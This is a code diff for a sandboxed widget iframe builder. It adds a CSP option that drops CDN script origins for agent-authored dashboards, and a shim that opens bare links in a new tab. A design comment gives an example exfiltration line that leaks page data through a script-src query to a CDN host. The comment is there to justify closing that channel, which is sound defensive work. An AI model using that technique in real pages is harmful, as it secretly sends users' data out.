@@ -9,7 +9,10 @@
 // cookies, localStorage, or navigate the parent page. allow-popups (+escape)
 // lets target="_blank" links open in a real new tab; reverse-
 // tabnabbing stays blocked by the mandated rel="noopener noreferrer" on
-// widget links. Same security model as Claude's artifacts (Anthropic).
+// widget links. A bare absolute link (no target) would otherwise navigate the
+// sandboxed frame itself, so EXTERNAL_LINK_TARGET_SHIM_BODY rewrites it to
+// _blank + noopener at click time (hosts that withhold allow-popups opt out
+// via rewriteBareLinks: false). Same security model as Claude's artifacts (Anthropic).
 //
 // DOMPurify is NOT applied because it strips <script> tags, which are
 // required for widget interactivity (Chart.js, D3, Tailwind CDN, etc.).
@@ -71,10 +74,24 @@ export const THEME_VAR_NAMES = [
 // A null-origin iframe cannot use 'self', which is why the origin is spelled out.
 // jsdelivr/cdnjs remain for widget-authored Chart.js/D3 (same-origin + SRI is a
 // follow-up). Tailwind v4 emits CSS as inline <style>, so style-src needs no CDN.
-const cspFor = (scriptOrigin: string): string =>
+//
+// `offlineScripts` DROPS those two origins, and a crewmate's dashboard sets it.
+// `connect-src 'none'` stops a page phoning home with fetch or a WebSocket, but a
+// permitted script ORIGIN is a second channel: a page may append
+// `<script src="https://cdn.jsdelivr.net/x.js?d=<encoded fields>">` and the browser
+// sends that query out. For a widget that is the accepted trade recorded above --
+// the author is the person reading it. A crewmate's dashboard page is different on
+// both counts: it is filled with that crewmate's own task titles, summaries and
+// costs, and since the preview/apply pair it can be authored by an AGENT and
+// accepted by somebody who read the rendering rather than the markup. The product
+// already states the property -- "a chart drawn from a CDN renders as a hole rather
+// than as a call home" -- so a dashboard document permitting those origins
+// contradicted the frame's own contract. A page draws its chart from the inline
+// script it ships, which stays permitted.
+const cspFor = (scriptOrigin: string, offlineScripts = false): string =>
   "default-src 'none'; " +
-  `script-src 'unsafe-inline' ${scriptOrigin}${TAILWIND_RUNTIME_PATH} ` +
-  "https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; " +
+  `script-src 'unsafe-inline' ${scriptOrigin}${TAILWIND_RUNTIME_PATH}` +
+  (offlineScripts ? '; ' : ' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; ') +
   "style-src 'unsafe-inline'; " +
   "img-src data: blob:; font-src data:; connect-src 'none'; " +
   "form-action 'none'; base-uri 'none';"
@@ -239,15 +256,6 @@ const HEIGHT_REPORTER_BODY = `(function(){
   });
 })();`
 
-/** Same-origin path to the Tailwind v4 browser runtime. A Vite plugin
- * (tailwindRuntimePlugin in vite.config.ts) copies @tailwindcss/browser's IIFE
- * build here at build time from the tracked npm dependency — so it is served
- * from the dashboard's own origin (not the public CDN that locked-down networks block) and is
- * NOT a committed blob (supply-chain guidance). Prefixed with window.location.origin
- * below because the sandboxed iframe is null-origin and can't use a bare path.
- * Defined once in ./vendorPaths and imported above so the consumer path can't
- * drift from vite.config.ts's dev-serve + build-emit sites. */
-
 /** Tailwind v4 browser build: dark mode is driven by a `.dark` class on <body>
  * (set below) via a custom variant — NOT the v3 `tailwind.config` global, which
  * v4 removed. The @tailwindcss/browser runtime auto-injects preflight + theme +
@@ -275,16 +283,6 @@ const COMMENT_HIGHLIGHT_CSS =
   "border-radius:10px 10px 10px 2px;box-shadow:0 1px 3px rgba(0,0,0,.35);cursor:pointer}" +
   ".mc-cmt-bubble.unread{background:var(--warn,#e0a000);color:var(--warn-fg,#1a1a1a)}"
 
-/** In-iframe comment bridge. Vanilla JS string — no LLM/user
- * interpolation (no `${}`), set via textContent and re-parsed by the iframe.
- * Brings anchored commenting + highlights into the sandboxed HTML render that
- * the parent cannot reach directly:
- *   - mouseup with a text selection -> postMessage 'mc-comment-select'
- *     {quote, prefix, suffix, rect} so the parent opens the comment popover;
- *   - 'mc-comment-highlights' {anchors:[{id,quote,prefix,suffix}]} -> wrap each
- *     matched run in <mark.mc-cmt-hl data-cid> (click -> 'mc-comment-highlight-click');
- *   - 'mc-comment-scroll-to' {id} -> scroll the mark into view + flash it;
- *   - posts 'mc-comment-ready' once so the parent pushes the initial set. */
 /** Guards against the "unsafe centering" clip: artifacts that lay out with
  * `body { display:flex; align-items:center }` (or grid `place-items:center`)
  * clip the TOP of their content — unreachable by scrolling — whenever the
@@ -402,6 +400,82 @@ const CLIPBOARD_FALLBACK_SHIM_BODY = `(function(){
   } catch (e) {}
 })();`
 
+/** Absolute web links inside the sandboxed document open OUTSIDE it.
+ *
+ * The frame's sandbox grants `allow-popups allow-popups-to-escape-sandbox`, so
+ * a link with `target="_blank"` becomes a window-open request the host handles
+ * -- in the desktop app that is `setWindowOpenHandler` -> `shell.openExternal`,
+ * i.e. the user's own default browser with their own logins; in a plain browser
+ * it is a new tab. A link WITHOUT a target navigates the sandboxed frame
+ * itself: the widget body is replaced by the target site rendered with no
+ * cookies (an SSO login page where a code-review page should be), inside a
+ * chat row that has no address bar and no way back. The agent is instructed to
+ * write `target="_blank"` on every link, but that instruction is only as
+ * reliable as the model that follows it, so this rewrites a bare absolute
+ * `http(s)://` link to `_blank` at click time.
+ *
+ * Scope is deliberately narrow:
+ *   - Only hrefs that parse (`new URL(href)`, no base) to an `http:`/`https:`
+ *     URL. Parsing rather than regex-matching the raw attribute means a link
+ *     the browser WOULD navigate (leading whitespace, embedded tab/newline)
+ *     is caught too. Fragment links (`#section`, in-widget tab navigation)
+ *     and relative paths do not parse without a base, so they keep their
+ *     default behaviour -- a `<base target="_blank">` would have sent those to
+ *     a new window too, which is why this is a click hook and not a `<base>`.
+ *     `mailto:` and other non-web schemes are left alone as well: the desktop
+ *     host's window-open handler (`electron/external-scheme.js`) hands only
+ *     web URLs and an exact allowlist to the OS and denies the rest, so
+ *     rewriting a `mailto:` to `_blank` would turn it into a dead click there.
+ *   - Only anchors with NO `target` attribute. An explicit `_self` is author
+ *     intent and stays.
+ *   - `data-action` anchors are the composer pre-fill buttons; that handler
+ *     (in HEIGHT_REPORTER_BODY) preventDefaults them, so they are skipped here.
+ *   - `rel="noopener noreferrer"` is set alongside so the opened page gets no
+ *     `window.opener` back into the frame.
+ *
+ * Registered on `window` in the capture phase, and this script runs before the
+ * widget's own, so it is the first click listener to fire: a widget-authored
+ * capture listener on `window` or `document` that stops propagation cannot get
+ * ahead of it. The anchor is resolved from `e.composedPath()[0]` so a link
+ * inside an open shadow root (where `e.target` is retargeted to the host) is
+ * still found. Setting the attribute during dispatch is sufficient: the
+ * anchor's activation behaviour reads `target` after dispatch completes.
+ *
+ * Only injected when the HOST frame grants popups (`rewriteBareLinks`, on by
+ * default). A frame whose sandbox withholds `allow-popups` -- the mochi pet
+ * frame, the crew webview -- turns a `_blank` link into a blocked popup, i.e. a
+ * dead click, which is worse than the in-frame navigation it replaces; those
+ * hosts pass `rewriteBareLinks: false` and keep their pre-existing behaviour.
+ * Not a security boundary (the frame is null-origin and, where this runs,
+ * popups are already allowed); it is a usability fix for the
+ * frame-replaced-by-login-page case.
+ */
+const EXTERNAL_LINK_TARGET_SHIM_BODY = `(function(){
+  window.addEventListener('click', function(e){
+    var path = typeof e.composedPath === 'function' ? e.composedPath() : null;
+    var t = (path && path.length) ? path[0] : e.target;
+    if (!t || typeof t.closest !== 'function') return;
+    var a = t.closest('a[href]');
+    if (!a || a.hasAttribute('target') || a.closest('[data-action]')) return;
+    var u;
+    try { u = new URL(a.getAttribute('href') || ''); } catch (_) { return; }
+    if (u.protocol !== 'http:' && u.protocol !== 'https:') return;
+    a.setAttribute('target', '_blank');
+    a.setAttribute('rel', 'noopener noreferrer');
+  }, true);
+})();`
+
+/** In-iframe comment bridge. Vanilla JS string — no LLM/user
+ * interpolation (no `${}`), set via textContent and re-parsed by the iframe.
+ * Brings anchored commenting + highlights into the sandboxed HTML render that
+ * the parent cannot reach directly:
+ *   - mouseup with a text selection -> postMessage 'mc-comment-select'
+ *     {quote, prefix, suffix, rect} so the parent opens the comment popover;
+ *   - 'mc-comment-highlights' {anchors:[{id,quote,prefix,suffix}]} -> wrap each
+ *     matched run in <mark.mc-cmt-hl data-cid> (click -> 'mc-comment-highlight-click');
+ *   - 'mc-comment-scroll-to' {id} -> scroll the mark into view + flash it;
+ *   - 'mc-comment-active' {id} -> mark that comment's highlights and bubble active;
+ *   - posts 'mc-comment-ready' once so the parent pushes the initial set. */
 const COMMENT_BRIDGE_BODY = `(function(){
   var PFX = 32;
   function selectionContext(){
@@ -839,11 +913,24 @@ interface BuildSrcdocOptions {
    * injected its compiled CSS. Set for widgets heavy enough that the compile is
    * perceptible; without it a slow widget renders as a blank box. */
   showLoadingOverlay?: boolean
+  /** Drop the CDN script origins from this document's CSP, leaving inline script
+   * and the pinned same-origin Tailwind runtime. Set by a crewmate's dashboard: its
+   * page is filled with that crewmate's own crew-log data and can be authored by an
+   * agent, so a permitted script origin is an exfiltration channel that
+   * `connect-src 'none'` does not close. Off by default, so no widget surface
+   * changes. */
+  offlineScripts?: boolean
   /** Localized label for that indicator. Required when `showLoadingOverlay` is
    * set — the iframe cannot reach the parent's i18n catalog, so an untranslated
    * default here would visibly flip to English mid-load in every non-English
    * locale. */
   loadingLabel?: string
+  /** Rewrite bare absolute `http(s)` links to `target="_blank"` at click time
+   * so they open outside the frame (see EXTERNAL_LINK_TARGET_SHIM_BODY). On by
+   * default. Set false when the host iframe's sandbox withholds
+   * `allow-popups`: there a `_blank` link is a blocked popup (a dead click),
+   * so in-frame navigation must be left alone. */
+  rewriteBareLinks?: boolean
 }
 
 /** Build the srcdoc HTML for a sandboxed widget iframe. The LLM `html`
@@ -858,6 +945,8 @@ export function buildSrcdoc({
   enableComments = false,
   showLoadingOverlay = false,
   loadingLabel = '',
+  rewriteBareLinks = true,
+  offlineScripts = false,
 }: BuildSrcdocOptions): string {
   // A widget hardcoded for a light canvas renders on a light canvas even when
   // the dashboard is dark -- see resolveWidgetTheme. Resolved once here so the
@@ -900,7 +989,7 @@ export function buildSrcdoc({
   // <meta CSP>
   const csp = doc.createElement('meta')
   csp.setAttribute('http-equiv', 'Content-Security-Policy')
-  csp.setAttribute('content', cspFor(scriptOrigin))
+  csp.setAttribute('content', cspFor(scriptOrigin, offlineScripts))
   head.appendChild(csp)
 
   // Tailwind v4 dark-mode directives (compiled by the runtime on load). Placed
@@ -976,6 +1065,17 @@ export function buildSrcdoc({
   const clipboardShim = doc.createElement('script')
   clipboardShim.textContent = CLIPBOARD_FALLBACK_SHIM_BODY
   body.appendChild(clipboardShim)
+
+  // Bare absolute links open outside the frame (see
+  // EXTERNAL_LINK_TARGET_SHIM_BODY). Installed before the LLM html so its
+  // capture-phase listener is registered ahead of any widget-authored one.
+  // Skipped for hosts whose sandbox withholds popups, where the rewrite would
+  // be a dead click. textContent assignment only.
+  if (rewriteBareLinks) {
+    const linkTargetShim = doc.createElement('script')
+    linkTargetShim.textContent = EXTERNAL_LINK_TARGET_SHIM_BODY
+    body.appendChild(linkTargetShim)
+  }
 
   // Parse LLM html into a document fragment via the typed DOM API. The
   // `html` argument flows through createContextualFragment() — NOT through
